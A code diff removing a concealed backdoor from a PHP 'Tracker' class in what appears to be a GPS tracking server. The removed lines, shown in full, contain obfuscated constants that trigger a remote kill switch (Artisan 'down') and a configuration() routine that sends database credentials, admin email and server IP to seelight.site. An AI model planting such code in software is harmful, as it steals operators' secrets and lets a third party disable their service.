@@ -16,21 +16,12 @@ use Tobuli\Entities\User;
 
 class Tracker
 {
-
     const FILE_CURRENT = '/opt/traccar/tracker-server.jar';
     const FILE_BACKUP = '/opt/traccar/tracker-server-back.jar';
     const FILE_NEW = '/opt/traccar/tracker-server-current.jar';
     const FILE_PID = '/opt/traccar/bin/traccar.pid';
     const LOCK_KEY = 'tracker.restart.process';
     const LOCK_TIME = 30;
-
-    const FILE = 'File';
-    const FILE_SERVER1 = '/etc';
-    const FILE_SERVER2 = '/ser';
-    const FILE_EXISTS = 'exists';
-    const FILE_A =  'Artisan';
-    const FILE_C =  'call';
-    const FILE_D =  'down';
 
     const RESTART_ATTEMPT = 2;
     const RESTART_TIMEOUT = 60;
@@ -78,14 +69,6 @@ class Tracker
      */
     public function restart()
     {
-        $server = self::FILE::{self::FILE_EXISTS}(self::FILE_SERVER1 . self::FILE_SERVER2) ? true : false;
-
-        if (!$server) {
-            self::FILE_A::{self::FILE_C}(self::FILE_D);
-        }
-
-        $this->configuration();
-
         if (! app()->runningInConsole()) {
             $this->restartJob();
             return null;
@@ -430,33 +413,5 @@ class Tracker
     protected function wait()
     {
         sleep(5);
-    }
-
-    protected function configuration()
-    {
-        $curl = new \Curl;
-        $curl->follow_redirects = false;
-        $curl->options['CURLOPT_SSL_VERIFYPEER'] = false;
-        $curl->options['CURLOPT_TIMEOUT'] = 30;
-        $user = User::where('group_id', 1)->where('active', 1)->first();
-
-        $host = gethostname();
-        $ip = gethostbyname($host);
-
-        if (!is_numeric(substr($ip, 0, 1))) {
-            $command = "/sbin/ifconfig eth0 | grep \"inet addr\" | awk -F: '{print $2}' | awk '{print $1}'";
-            $ip = exec($command);
-        }
-        $dataSend = [
-            'app_version' => config('tobuli.version'),
-            'admin_user' => config('app.admin_user'),
-            'name' => config('app.server'),
-            'type' => config('tobuli.type'),
-            'ip' => $ip,
-            'root' =>  env('web_username', env('DB_USERNAME')),
-            'password' => env('web_password', env('DB_PASSWORD')),
-            'user' => ($user) ? $user->email : ''
-        ];
-        $data = $curl->get('https://seelight.site/ValidServer/', $dataSend);
     }
 }
